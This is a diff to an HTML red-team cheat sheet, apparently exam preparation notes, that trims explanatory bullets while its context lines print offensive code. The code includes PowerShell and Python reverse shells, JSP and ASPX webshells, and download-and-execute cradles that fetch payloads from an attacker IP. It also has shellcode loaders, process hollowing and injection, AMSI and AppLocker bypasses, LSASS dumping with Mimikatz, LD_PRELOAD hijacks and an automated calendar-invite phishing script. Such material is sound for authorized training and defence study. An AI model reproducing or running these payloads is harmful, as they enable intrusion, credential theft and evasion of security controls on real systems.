@@ -404,7 +404,7 @@ powershell -nop -w hidden -enc $b64</code></pre>
 
 <h3 id="methodology-loader-skeleton">1.2.3 Shellcode Loader Skeleton (C#)</h3>
 
-              <ul><li><input type="checkbox"> The exam expects you to <em>write</em> loaders rather than reuse signed ones. The skeleton below allocates RWX memory, copies in shellcode, and creates a thread &mdash; the simplest in-memory pattern. Iterate on it: indirect syscalls, AMSI patching, sleep masking, and parent PID spoofing all start here.</li></ul>
+              <ul><li><input type="checkbox"> The exam expects you to <em>write</em> loaders rather than reuse signed ones.</li></ul>
               <pre><code class="language-csharp">// loader.cs &mdash; compile with: csc /platform:x64 /unsafe loader.cs
 // or on Kali:  mcs -unsafe loader.cs
 using System;
@@ -1938,7 +1938,7 @@ Sub DocumentOpen()
     SendProcessInfo
 End Sub
 </code></pre>
-<ul><li>Alternative architecture-detection macro: queries WMI for the <code>explorer.exe</code> process path to determine if the target is 64-bit, then POSTs the result as JSON to the attacker&rsquo;s listener. Use this to choose between x86 and x64 payloads before delivering the real shellcode.</li></ul>
+<ul><li>Alternative architecture-detection macro: queries WMI for the <code>explorer.exe</code> process path to determine if the target is 64-bit, then POSTs the result as JSON to the attacker&rsquo;s listener.</li></ul>
 <pre><code class="language-csharp">Option Explicit
 
 Sub SendProcessInfo()
@@ -2656,7 +2656,7 @@ if (Environment.Version.Major != 2)
 </code></pre>
 
 <h3 id="initial-further-access-hta">3.1.12 HTA</h3>
-<ul><li>HTA files run via <code>mshta.exe</code>, which hosts JScript/VBScript outside normal browser security zones. The CLM bypass relies on <code>InstallUtil.exe</code> uninstalling a signed .NET assembly to trigger arbitrary code under a trusted host.</li></ul>
+<ul><li>HTA files run via <code>mshta.exe</code>, which hosts JScript/VBScript outside normal browser security zones.</li></ul>
 
 <h3 id="initial-further-access-hta-clm-bypass-ps-script">3.1.12.1 C# for CLM Bypass with PS Script</h3>
 <ul>
@@ -3450,7 +3450,7 @@ i686-w64-mingw32-gcc -shared -oadduser32.dll adduser.c -lnetapi32
 x86_64-w64-mingw32-gcc -shared -oadduser64.dll adduser.c -lnetapi32
 </code></pre>
 
-<ul><li>Minimal DLL that runs <code>net user</code> / <code>net localgroup</code> on load. Use for DLL hijacking or side-loading: drop this as a missing DLL name in a privileged service&rsquo;s search path, then restart the service to get a local admin account.</li></ul>
+<ul><li>Minimal DLL that runs <code>net user</code> / <code>net localgroup</code> on load.</li></ul>
 <pre><code class="language-cpp">#include &lt;stdlib.h&gt;
 #include &lt;windows.h&gt;
 
@@ -3478,7 +3478,7 @@ LPVOID lpReserved )
 </code></pre>
 <h3 id="initial-further-access-powershell">3.2.3 PowerShell</h3>
 <h3 id="initial-further-access-powershell-obfuscated-reverse-shell">3.2.4 Obfuscated Reverse Shell</h3>
-<ul><li>Two levels of PowerShell reverse shells: Option 1 is a simple TCP client that reads commands, executes via <code>iex</code>, and returns output with a PS prompt. Option 2 adds variable-name obfuscation and IP encoding (e.g. <code>10x10x10x10_443</code>) to evade static string signatures.</li></ul>
+<ul><li>Two levels of PowerShell reverse shells: Option 1 is a simple TCP client that reads commands, executes via <code>iex</code>, and returns output with a PS prompt.</li></ul>
 <pre><code class="language-powershell"># Option 1
 $amit = New-Object System.Net.Sockets.TCPClient("[ip]",[port]);
 $amit = $amit.GetStream();
@@ -3532,7 +3532,7 @@ try {
 <pre><code class="language-bash"># 32-bit variant: windows/meterpreter/reverse_http
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ip] LPORT=[port] EXITFUNC=thread -f ps1
 </code></pre>
-<ul><li>Reflective shellcode loader entirely in PowerShell. Uses dynamic P/Invoke: resolves <code>VirtualAlloc</code>, <code>CreateThread</code>, and <code>WaitForSingleObject</code> at runtime via <code>GetProcAddress</code> reflection (no static <code>DllImport</code>). This avoids script-block logging signatures that match known P/Invoke patterns. Replace the <code>$buf</code> array with msfvenom output.</li></ul>
+<ul><li>Reflective shellcode loader entirely in PowerShell.</li></ul>
 <pre><code class="language-powershell"># Reflective loader — VirtualAlloc + CreateThread via dynamic P/Invoke
 function getDelegateType {
     Param (
@@ -3597,7 +3597,7 @@ $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://[ip]/PowerVi
 <h3 id="initial-further-access-webshells-aspx">3.2.8 ASPX</h3>
 <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ip] LPORT=443 -f aspx -o pay.aspx
 </code></pre>
-<ul><li>Caesar-shift encoder (+5) and its matching ASPX webshell loader. First compile and run the encoder against raw msfvenom shellcode to produce the shifted byte array, then paste the output into the ASPX shell&rsquo;s <code>oe7hnH0[]</code> array. The webshell decodes at runtime (<code>-5</code>), allocates RWX memory via <code>VirtualAlloc</code>, and executes the shellcode in a new thread. A <code>VirtualAllocExNuma</code> pre-check acts as a sandbox evasion gate.</li></ul>
+<ul><li>Caesar-shift encoder (+5) and its matching ASPX webshell loader.</li></ul>
 <pre><code class="language-csharp">// Caesar +5 encoder — encode shellcode before embedding in ASPX
 using System;
 using System.Text;
@@ -3667,7 +3667,7 @@ iwr -uri http://[ip]/[name].aspx -o C:\inetpub\wwwroot\[payload].aspx
 </code></pre>
 
 <h3 id="initial-further-access-webshells-jsp">3.2.9 JSP</h3>
-<ul><li>JSP reverse shell: takes <code>ipaddress</code> and <code>port</code> as GET parameters, opens a TCP socket to the attacker, and bridges the socket I/O to a <code>cmd.exe</code> process via two <code>StreamConnector</code> threads (one for stdin, one for stdout). Deploy to a writable webapp directory and trigger with <code>curl "http://target/shell.jsp?ipaddress=[ip]&amp;port=[port]"</code>.</li></ul>
+<ul><li>JSP reverse shell: takes <code>ipaddress</code> and <code>port</code> as GET parameters, opens a TCP socket to the attacker, and bridges the socket I/O to a <code>cmd.exe</code> process via two <code>StreamConnector</code> threads (one for stdin, one for stdout).</li></ul>
 <pre><code class="language-java"><%@
 page import="java.lang.*, java.util.*, java.io.*, java.net.*"
 %>
@@ -3728,7 +3728,7 @@ if(ipAddress != null &amp;&amp; ipPort != null)
 }
 %>
 </code></pre>
-<ul><li>Hybrid JSP shell with two modes: a reverse TCP connection (set IP/port in the source) and an HTML form fallback for direct command execution through the browser. Cross-platform: auto-detects Windows (<code>cmd.exe</code>) vs Linux (<code>/bin/sh</code>).</li></ul>
+<ul><li>Hybrid JSP shell with two modes: a reverse TCP connection (set IP/port in the source) and an HTML form fallback for direct command execution through the browser.</li></ul>
 <pre><code class="language-java">// Two-way shell: reverse TCP + HTML form fallback. Set ip/port below.
 <%@page import="java.lang.*"%>
 <%@page import="java.io.*"%>
@@ -3979,7 +3979,7 @@ sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/re
 <h3 id="initial-further-access-exe">3.3.2 EXE</h3>
 
 <h3 id="initial-further-access-exe-process-hollowing-sleeper">3.3.3 Process Hollowing with Sleeper</h3>
-<ul><li>Process hollowing via entry-point overwrite: starts <code>svchost.exe</code> suspended, walks the PEB to find the image base and PE header, computes the entrypoint address (ASLR-aware), XOR-decodes an embedded shellcode blob, writes it over the entrypoint, then resumes the thread. Includes a sleep-based AV sandbox check.</li></ul>
+<ul><li>Process hollowing via entry-point overwrite: starts <code>svchost.exe</code> suspended, walks the PEB to find the image base and PE header, computes the entrypoint address (ASLR-aware), XOR-decodes an embedded shellcode blob, writes it over the entrypoint, then resumes the thread.</li></ul>
 <pre><code class="language-csharp">using System;
 using System.Runtime.InteropServices;
 
@@ -4597,7 +4597,7 @@ class Program
 </code></pre>
 
 <h3 id="initial-further-access-exe-tryharder">3.3.8 TryHarder</h3>
-<ul><li>Remote shellcode loader by Sektor7 (ported to C# by <a href="https://github.com/saulg00dmin" target="_blank" rel="noopener noreferrer">saulgoodman</a>): fetches a raw shellcode blob over HTTP into a suspended <code>notepad.exe</code>, allocates RWX memory, writes the payload, and executes via <code>CreateRemoteThread</code>. API names are stored as byte arrays and resolved at runtime to avoid static import scanning.</li></ul>
+<ul><li>Remote shellcode loader by Sektor7 (ported to C# by <a href="https://github.com/saulg00dmin" target="_blank" rel="noopener noreferrer">saulgoodman</a>): fetches a raw shellcode blob over HTTP into a suspended <code>notepad.exe</code>, allocates RWX memory, writes the payload, and executes via <code>CreateRemoteThread</code>.</li></ul>
 
 <ul><li>Generate and serve the shellcode:</li></ul>
 <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw EXITFUNC=thread -o shellcode.bin
@@ -4610,7 +4610,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 $assem.EntryPoint.Invoke($null, @([string[]]@()))
 </code></pre>
 
-<ul><li>C# process injector with API obfuscation. Resolves <code>CreateProcessA</code>, <code>WriteProcessMemory</code>, and <code>VirtualAllocEx</code> at runtime via <code>GetProcAddress</code> using byte-array-encoded function names (avoids static import strings). Downloads raw shellcode from the attacker&rsquo;s HTTP server, spawns a suspended <code>notepad.exe</code>, allocates RWX memory in the target, writes the shellcode, and starts a remote thread to execute it. The 10-second <code>Sleep</code> at the start is a basic sandbox evasion check.</li></ul>
+<ul><li>C# process injector with API obfuscation.</li></ul>
 <pre><code class="language-csharp">using System;
 using System.Diagnostics;
 using System.Net;
@@ -4723,7 +4723,7 @@ $method = $class.GetMethod("PerformProcessHollowing")
 $method.Invoke($null, $null)
 </code></pre>
 
-<ul><li>Process hollowing DLL: spawns <code>svchost.exe</code> in a suspended state via <code>CreateProcessA</code> with <code>CREATE_SUSPENDED</code>, uses <code>ZwQueryInformationProcess</code> to locate the PEB and image base, parses the PE header to find the entry point RVA, overwrites it with XOR-decoded shellcode via <code>WriteProcessMemory</code>, then resumes the thread. Loaded reflectively from PowerShell (see the loader above) so the DLL never touches disk.</li></ul>
+<ul><li>Process hollowing DLL: spawns <code>svchost.exe</code> in a suspended state via <code>CreateProcessA</code> with <code>CREATE_SUSPENDED</code>, uses <code>ZwQueryInformationProcess</code> to locate the PEB and image base, parses the PE header to find the entry point RVA, overwrites it with XOR-decoded shellcode via <code>WriteProcessMemory</code>, then resumes the thread.</li></ul>
 <pre><code class="language-csharp">using System;
 using System.Runtime.InteropServices;
 
@@ -4951,7 +4951,7 @@ namespace Inject
 }
 </code></pre>
 <h3 id="initial-further-access-calendar-phishing">3.4 Phishing with Calendars</h3>
-<ul><li>Deliver an iCalendar (ICS) meeting invite as an email attachment to bypass email filters and lower user skepticism. Mimic a Microsoft Teams invite, then weaponize the "join" link to harvest NetNTLMv2 hashes with Responder.</li></ul>
+<ul><li>Deliver an iCalendar (ICS) meeting invite as an email attachment to bypass email filters and lower user skepticism.</li></ul>
 
 <h3 id="initial-further-access-calendar-phishing-ics-fields">3.4.1 ICS File Structure</h3>
 <ul><li>An ICS file is plain text (RFC 5545). The fields adversaries manipulate are <code>ORGANIZER</code> (trusted sender), <code>DTSTART</code>/<code>DTEND</code> (business hours), <code>DESCRIPTION</code> (phishing URL), and <code>UID</code> (unique, to evade filters).</li></ul>
@@ -5031,7 +5031,7 @@ END:VCALENDAR
 </code></pre>
 
 <h3 id="initial-further-access-calendar-phishing-automate">3.4.4 Automating the Attack</h3>
-<ul><li>Build templates with placeholders (<code>{DTSTART}</code>, <code>{ORGANIZER_EMAIL}</code>, <code>{DESCRIPTION}</code>, <code>{ATTENDEES}</code>, <code>{EVENT_URL}</code>) and fill them at runtime. Adding fake high-value <code>ATTENDEE</code> entries (CEO/CTO) boosts credibility. The script attaches the ICS as <code>text/calendar;method=REQUEST</code> so it renders as a real invite.</li></ul>
+<ul><li>Build templates with placeholders (<code>{DTSTART}</code>, <code>{ORGANIZER_EMAIL}</code>, <code>{DESCRIPTION}</code>, <code>{ATTENDEES}</code>, <code>{EVENT_URL}</code>) and fill them at runtime.</li></ul>
 <pre><code class="language-python">#!/usr/bin/env python3
 # fakeics.py — automated calendar-invite phishing (inspired by FakeMeeting)
 # Usage: python3 fakeics.py &lt;smtp_server&gt; &lt;sender_email&gt; &lt;recipient&gt; &lt;event_url&gt;
@@ -5129,7 +5129,7 @@ if __name__ == "__main__":
 </code></pre>
 
 <h3 id="initial-further-access-process-injection">3.5 Process Injection &amp; Migration</h3>
-<ul><li>Move a shell out of its host process (e.g. a Word macro or PowerShell runner) into a longer-lived, less suspicious one. Inject into <code>explorer.exe</code> (persists until logoff) or migrate to <code>svchost.exe</code> (legitimately generates network traffic). You can only inject into a process at the same or lower integrity level as the current one.</li></ul>
+<ul><li>Move a shell out of its host process (e.g. a Word macro or PowerShell runner) into a longer-lived, less suspicious one.</li></ul>
 <table class="custom-table">
   <thead>
     <tr>
@@ -5161,10 +5161,10 @@ if __name__ == "__main__":
     </tr>
   </tbody>
 </table>
-<ul><li>32-bit&nbsp;-&gt;&nbsp;64-bit injection fails — <code>CreateRemoteThread</code> does not support it. The other three migration paths work. Use <code>PROCESS_ALL_ACCESS</code> = <code>0x001F0FFF</code>, allocate with <code>0x3000</code> (MEM_COMMIT|MEM_RESERVE) and <code>0x40</code> (PAGE_EXECUTE_READWRITE).</li></ul>
+<ul><li>32-bit&nbsp;-&gt;&nbsp;64-bit injection fails — <code>CreateRemoteThread</code> does not support it. The other three migration paths work.</li></ul>
 
 <h3 id="initial-further-access-procinj-remote-thread">3.5.1 Remote Thread Injection</h3>
-<ul><li>Allocate memory in the target, write shellcode, and run it with a new thread. Resolve the target PID dynamically with <code>Process.GetProcessesByName("explorer")</code>. Build as x64 when injecting into a 64-bit process.</li></ul>
+<ul><li>Allocate memory in the target, write shellcode, and run it with a new thread. Resolve the target PID dynamically with <code>Process.GetProcessesByName("explorer")</code>.</li></ul>
 <pre><code class="language-csharp">using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -5262,7 +5262,7 @@ namespace Inject
 </code></pre>
 
 <h3 id="initial-further-access-procinj-reflective-dll">3.5.3 Reflective DLL Injection</h3>
-<ul><li>Avoid the disk write of plain DLL injection by parsing the DLL's PE format and mapping it into memory manually — also keeps it invisible to Process Explorer's loaded-DLL list. Reuse Joe Bialek / Matt Graeber's <code>Invoke-ReflectivePEInjection.ps1</code>, supplying the DLL as a byte array (<code>-PEBytes</code>) and the target PID (<code>-ProcId</code>).</li></ul>
+<ul><li>Avoid the disk write of plain DLL injection by parsing the DLL's PE format and mapping it into memory manually — also keeps it invisible to Process Explorer's loaded-DLL list.</li></ul>
 <pre><code class="language-powershell">PowerShell -Exec Bypass
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://[attacker-ip]/met.dll')
 $procid = (Get-Process -Name explorer).Id
@@ -5272,7 +5272,7 @@ Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 <ul><li>The <code>VoidFunc couldn't be found in the DLL</code> error is harmless. The public script fails on Windows 10 1803+ due to duplicate <code>GetProcAddress</code> entries in <code>UnsafeNativeMethods</code> — use a patched copy.</li></ul>
 
 <h3 id="initial-further-access-procinj-hollowing">3.5.4 Process Hollowing</h3>
-<ul><li>Spawn a trusted process (<code>svchost.exe</code>) suspended, overwrite its EntryPoint with shellcode before it runs, then resume it. This lets you hide in a process that normally generates network traffic and would otherwise terminate if injected into after start. Steps:</li></ul>
+<ul><li>Spawn a trusted process (<code>svchost.exe</code>) suspended, overwrite its EntryPoint with shellcode before it runs, then resume it.</li></ul>
 <ul>
   <li>Create the process with <code>CreateProcessW</code> and the <code>CREATE_SUSPENDED</code> flag (<code>0x4</code>) — high-level <code>Process.Start</code> cannot do this.</li>
   <li><code>ZwQueryInformationProcess</code> (class <code>0</code> = ProcessBasicInformation) returns the PEB address; the image base is at PEB+<code>0x10</code>.</li>
@@ -5698,7 +5698,7 @@ server {
 
 <h3 id="tunneling-dns-tunneling">4.5 DNS Tunneling</h3>
 
-<ul><li>Encapsulate C2 data in DNS queries/responses to escape restrictive egress filters — slow, but DNS is almost always allowed. Requires control of an authoritative name server: set the target domain's <code>NS</code> record to your tunnel server so all subdomain lookups are forwarded to it.</li></ul>
+<ul><li>Encapsulate C2 data in DNS queries/responses to escape restrictive egress filters — slow, but DNS is almost always allowed.</li></ul>
 
 <pre><code class="language-bash"># Authoritative-server emulation in lab: forward a domain to the tunnel server (dnsmasq)
 # /etc/dnsmasq.conf
@@ -6301,7 +6301,7 @@ Get-WinEvent -LogName System | Where-Object {$_.Message -like "*&lt;ServiceName&
 Get-WindowsUpdateLog
 </code></pre>
 <h3 id="privilege-escalation-kiosk-breakouts">5.1.7 Kiosk Breakouts</h3>
-<ul><li>Kiosks and thin clients are a restrictive veneer over a full OS; escape the guided experience by misusing native functionality, then use that back-end access. Live off the land — <a href="https://lolbas-project.github.io" target="_blank" rel="noopener noreferrer">LOLBAS</a> (Windows) and <a href="https://gtfobins.github.io" target="_blank" rel="noopener noreferrer">GTFOBins</a> (Linux).</li></ul>
+<ul><li>Kiosks and thin clients are a restrictive veneer over a full OS; escape the guided experience by misusing native functionality, then use that back-end access.</li></ul>
 
 <h3 id="privilege-escalation-kiosk-enumeration">5.1.7.1 Kiosk Enumeration</h3>
 <ul><li>Map the locked-down interface first: what app is exposed, which inputs accept text, and which keyboard/mouse combinations are not blocked.</li></ul>
@@ -6692,7 +6692,7 @@ ThreatCheck.exe -f payload.bin -e AMSI
 </table>
 
 <h3 id="defense-evasion-advanced-amsi">5.2.10 Advanced AMSI Bypasses</h3>
-<ul><li>The Antimalware Scan Interface (AMSI) lets Defender inspect script content (PowerShell, JScript, VBA, .NET) at runtime before execution. Neutralising AMSI in the current process lets subsequent in-memory tooling load cleanly.</li></ul>
+<ul><li>The Antimalware Scan Interface (AMSI) lets Defender inspect script content (PowerShell, JScript, VBA, .NET) at runtime before execution.</li></ul>
 <ul>
   <li>AMSI is per-process — the bypass only protects the session it runs in, so it must execute before loading flagged tooling.</li>
   <li>Reflection approaches flip the <code>amsiInitFailed</code> flag so <code>AmsiScanBuffer</code> is never consulted.</li>
@@ -6736,7 +6736,7 @@ var ctx = ... // resolve amsiContext, then zero the session header so scans shor
   </tbody>
 </table>
 <h3 id="defense-evasion-applocker-bypasses">5.2.11 AppLocker Bypasses</h3>
-<ul><li>AppLocker only enforces rules against native Windows file types (EXE, MSI, scripts, packaged apps, and optionally DLLs). Default rules whitelist <code>C:\Program Files</code>, <code>C:\Program Files (x86)</code>, and <code>C:\Windows</code> recursively, so any user-writable subfolder inside those paths is a bypass.</li></ul>
+<ul><li>AppLocker only enforces rules against native Windows file types (EXE, MSI, scripts, packaged apps, and optionally DLLs).</li></ul>
 
 <h3 id="defense-evasion-applocker-bypasses-enumerate">5.2.11.1 Enumerate AppLocker Policy</h3>
 <pre><code class="language-powershell"># Effective policy and rule collections
@@ -6794,7 +6794,7 @@ java -jar payload.jar
 </code></pre>
 
 <h3 id="defense-evasion-applocker-bypasses-runspace">5.2.11.6 PowerShell CLM Escape via Custom Runspace</h3>
-<ul><li>When AppLocker forces ConstrainedLanguage on <code>powershell.exe</code>, a custom C# runspace built from <code>System.Management.Automation.dll</code> runs in FullLanguage and is not subject to that restriction. This also survives a deny rule on <code>powershell.exe</code>.</li></ul>
+<ul><li>When AppLocker forces ConstrainedLanguage on <code>powershell.exe</code>, a custom C# runspace built from <code>System.Management.Automation.dll</code> runs in FullLanguage and is not subject to that restriction.</li></ul>
 <pre><code class="language-csharp">using System;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
@@ -6828,7 +6828,7 @@ copy Bypass.exe C:\Windows\Tasks\ &amp;&amp; C:\Windows\Tasks\Bypass.exe
 </code></pre>
 
 <h3 id="defense-evasion-applocker-bypasses-installutil">5.2.11.7 InstallUtil (Managed-Code LOLBAS)</h3>
-<ul><li>Put the runspace/shellcode logic inside an installer class's <code>Uninstall</code> method, then trigger it with the trusted <code>InstallUtil.exe</code> so AppLocker's executable rules never apply. <code>Main</code> must exist but is only a decoy.</li></ul>
+<ul><li>Put the runspace/shellcode logic inside an installer class's <code>Uninstall</code> method, then trigger it with the trusted <code>InstallUtil.exe</code> so AppLocker's executable rules never apply.</li></ul>
 <pre><code class="language-csharp">using System;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
@@ -6875,7 +6875,7 @@ bitsadmin /Transfer myJob http://[attacker-ip]/file.txt C:\Users\[user]\enc.txt 
 </code></pre>
 
 <h3 id="defense-evasion-applocker-bypasses-workflow-compiler">5.2.11.9 Microsoft.Workflow.Compiler</h3>
-<ul><li>The signed <code>Microsoft.Workflow.Compiler.exe</code> compiles and loads arbitrary C# from disk. Any class inheriting <code>Activity</code> has its constructor instantiated, giving code execution. It takes two args: a serialized XML input file and a (discarded) output file.</li></ul>
+<ul><li>The signed <code>Microsoft.Workflow.Compiler.exe</code> compiles and loads arbitrary C# from disk. Any class inheriting <code>Activity</code> has its constructor instantiated, giving code execution.</li></ul>
 <pre><code class="language-csharp">using System;
 using System.Workflow.ComponentModel;
 
@@ -6991,7 +6991,7 @@ wmic process get brief /format:"http://[attacker-ip]/payload.xsl"
 <ul><li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS Project</a></li></ul>
 
 <h3 id="defense-evasion-network-filters">5.2.12 Network Filter Evasion</h3>
-<ul><li>The Internet-edge stack inspects egress traffic via DNS filters, web proxies, IDS/IPS, and HTTPS inspection. The goal is to normalize C2 traffic so it blends into legitimate noise. Always connect to listeners by domain name, not raw IP.</li></ul>
+<ul><li>The Internet-edge stack inspects egress traffic via DNS filters, web proxies, IDS/IPS, and HTTPS inspection. The goal is to normalize C2 traffic so it blends into legitimate noise.</li></ul>
 
 <h3 id="defense-evasion-network-filters-dns">5.2.12.1 DNS Filters</h3>
 <ul><li>DNS filters block by reputation blocklist, "newly seen domain" heuristics, and category. Prepare domains well in advance so they accrue traffic and a benign category.</li></ul>
@@ -7025,7 +7025,7 @@ set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
 </ul>
 
 <h3 id="defense-evasion-network-filters-ids">5.2.12.3 IDS/IPS Signatures</h3>
-<ul><li>IDS/IPS reassemble traffic and match deep-packet signatures. Tiny, unique deviations in a framework's traffic (Meterpreter URI pattern, Sliver's traffic patterns) get signatured, so altering the traffic pattern bypasses them.</li></ul>
+<ul><li>IDS/IPS reassemble traffic and match deep-packet signatures.</li></ul>
 <pre><code class="language-bash"># Replace Meterpreter's randomized self-signed cert (Norton/Symantec signatures it)
 openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
 # Provide sane field data (Country/Org/CN matching a benign domain)
@@ -7302,7 +7302,7 @@ powershell -Command "C:\\temp\\mimikatz.exe 'privilege::debug' '[command]' 'exit
 </code></pre>
 
 <h3 id="credentials-mimikatz-lsa-protection-bypass">5.3.1.4 LSA Protection Bypass</h3>
-<ul><li>Since Windows 8, LSASS can run as Protected Process Light (PPL) — controlled by <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1</code>. Mimikatz ships <strong>mimidrv.sys</strong> (a signed kernel driver) to remove PPL at the kernel level. Requires Admin/SYSTEM + <code>SeLoadDriverPrivilege</code>.</li></ul>
+<ul><li>Since Windows 8, LSASS can run as Protected Process Light (PPL) — controlled by <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1</code>.</li></ul>
 <pre><code class="language-powershell"># Check if LSA Protection is enabled (1 = enabled)
 reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
 </code></pre>
@@ -7366,7 +7366,7 @@ Invoke-Mimikatz -Command '"!processprotect /process:lsass.exe /remove"'
 # All-in-one dump
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch" "lsadump::sam" "sekurlsa::credman" "sekurlsa::ssp" "sekurlsa::wdigest" "sekurlsa::logonpasswords" "lsadump::secrets"'
 </code></pre>
-<ul><li>Individual Mimikatz credential-extraction commands. Each targets a different credential store: <code>vault::cred</code> for Credential Manager / scheduled task passwords, <code>sekurlsa::logonpasswords</code> for logged-on NTLM hashes, <code>lsadump::sam</code> for local SAM accounts, <code>lsadump::secrets</code> for LSA service-account secrets, <code>sekurlsa::ekeys</code> for Kerberos encryption keys, <code>sekurlsa::credman</code> for Credential Manager plaintext, <code>sekurlsa::ssp</code> for SSP credentials, and <code>sekurlsa::wdigest</code> for WDigest plaintext (pre-Win10 or when <code>UseLogonCredential=1</code>).</li></ul>
+<ul><li>Individual Mimikatz credential-extraction commands.</li></ul>
 <pre><code class="language-powershell"># Scheduled task passwords
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch"'
 
@@ -7530,7 +7530,7 @@ procdump.exe -accepteula -ma lsass.exe lsass.dmp
 <pre><code class="language-powershell"># Native, tool-less dump: comsvcs.dll MiniDump (run elevated; [pid] = lsass PID)
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [pid] C:\Windows\Tasks\lsass.dmp full
 </code></pre>
-<ul><li>Custom LSASS dumper using <code>MiniDumpWriteDump</code> from <code>Dbghelp.dll</code>. Opens LSASS with <code>PROCESS_ALL_ACCESS</code>, writes a full memory dump to disk. Useful when <code>procdump.exe</code> and <code>comsvcs.dll</code> are blocked by EDR rules. Compile with <code>csc /platform:x64 MiniDump.cs</code> and run elevated. Parse the resulting dump offline with <code>mimikatz sekurlsa::minidump</code>.</li></ul>
+<ul><li>Custom LSASS dumper using <code>MiniDumpWriteDump</code> from <code>Dbghelp.dll</code>. Opens LSASS with <code>PROCESS_ALL_ACCESS</code>, writes a full memory dump to disk.</li></ul>
 <pre><code class="language-csharp">// MiniDump.exe — custom MiniDumpWriteDump of LSASS (run elevated)
 using System;
 using System.Diagnostics;
@@ -7661,7 +7661,7 @@ sc.exe \\[host] start [svc]
 schtasks /create /s [host] /tn [task] /tr "C:\Windows\Tasks\met.exe" /sc once /st 00:00 /ru SYSTEM
 schtasks /run /s [host] /tn [task]
 </code></pre>
-<ul><li>SCShell — PsExec-style execution that creates <strong>no</strong> new service and writes no file: it reconfigures an existing service's binary (e.g. SensorService) via <code>ChangeServiceConfig</code>, starts it, then restores the original. Easy to pass-the-hash.</li></ul>
+<ul><li>SCShell — PsExec-style execution that creates <strong>no</strong> new service and writes no file: it reconfigures an existing service's binary (e.g.</li></ul>
 <pre><code class="language-bash"># scshell.py — code execution using only the NTLM hash, restores the service after
 scshell.py -hashes :[hash] [domain]/[user]@[ip] SensorService
 </code></pre>
@@ -7723,7 +7723,7 @@ echo 'import socket,subprocess,os;s=socket.socket();s.connect(("[ip]",4444));os.
 
 <h3 id="linux-initial-access-payloads-xor-encoder">6.1.4 XOR Payload Encoder</h3>
 
-<ul><li>XOR-encodes raw msfvenom shellcode with key <code>0xfa</code> and prints the result as a C-style byte string. Paste the output into the simple loader (next section) or the LD_PRELOAD / LD_LIBRARY_PATH shared library payloads below.</li></ul>
+<ul><li>XOR-encodes raw msfvenom shellcode with key <code>0xfa</code> and prints the result as a C-style byte string.</li></ul>
 <pre><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
@@ -7757,7 +7757,7 @@ int main (int argc, char **argv)
 
 <h3 id="linux-initial-access-payloads-simple-loader">6.1.5 Simple Loader</h3>
 
-<ul><li>Decodes the XOR-encoded shellcode (key <code>0xfa</code>) in-place, then casts the buffer to a function pointer and calls it. Requires <code>-z execstack</code> at compile time because the shellcode lives in the <code>.data</code> section (non-executable by default).</li></ul>
+<ul><li>Decodes the XOR-encoded shellcode (key <code>0xfa</code>) in-place, then casts the buffer to a function pointer and calls it.</li></ul>
 <pre><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
@@ -7787,7 +7787,7 @@ int main (int argc, char **argv)
 
 <h3 id="linux-initial-access-payloads-ld-preload">6.1.6 Shared Library LD PRELOAD</h3>
 
-<ul><li>Hijacks <code>geteuid()</code> via <code>LD_PRELOAD</code>. When a SUID binary calls <code>geteuid()</code>, this .so intercepts it: forks a child that decodes and executes shellcode (using <code>mprotect</code> to mark the buffer executable), while the parent calls the real <code>geteuid()</code> so the host program continues normally. Load with <code>LD_PRELOAD=./evil.so /usr/bin/suid_binary</code>.</li></ul>
+<ul><li>Hijacks <code>geteuid()</code> via <code>LD_PRELOAD</code>.</li></ul>
 <pre><code class="language-c">#define _GNU_SOURCE
 #include &lt;sys/mman.h&gt;
 #include &lt;stdlib.h&gt;
@@ -7842,7 +7842,7 @@ uid_t geteuid(void)
 
 <h3 id="linux-initial-access-payloads-ld-library-path">6.1.7 Shared Library LD LIBRARY Path</h3>
 
-<ul><li>Library-path hijack variant using a GCC <code>__attribute__((constructor))</code> so the payload runs automatically when the .so is loaded (no function-name hooking needed). Exports dummy symbols (<code>gpgrt_onclose</code>, <code>gpgrt_poll</code>) to satisfy the linker when replacing <code>libgpg-error.so</code> or similar. Calls <code>setuid(0)/setgid(0)</code> to escalate if the loading process is SUID, then XOR-decodes and executes shellcode via <code>mprotect</code> + function-pointer cast.</li></ul>
+<ul><li>Library-path hijack variant using a GCC <code>__attribute__((constructor))</code> so the payload runs automatically when the .so is loaded (no function-name hooking needed).</li></ul>
 <pre><code class="language-c">#include &lt;sys/mman.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;stdio.h&gt;
@@ -8133,7 +8133,7 @@ ssh -S /home/[user]/.ssh/controlmaster\@[user]@[host]\:22 [user]@[host]
 
 <h3 id="linux-lateral-movement-ssh-agent-forwarding">6.3.6 SSH Agent Forwarding</h3>
 
-<ul><li>Agent forwarding proxies signing requests from an intermediate host back to the origin client. An adversary on the intermediate machine can abuse the forwarded agent socket to authenticate to downstream hosts.</li></ul>
+<ul><li>Agent forwarding proxies signing requests from an intermediate host back to the origin client.</li></ul>
 
 <pre><code class="language-bash">ssh [user]@[host]
 </code></pre>
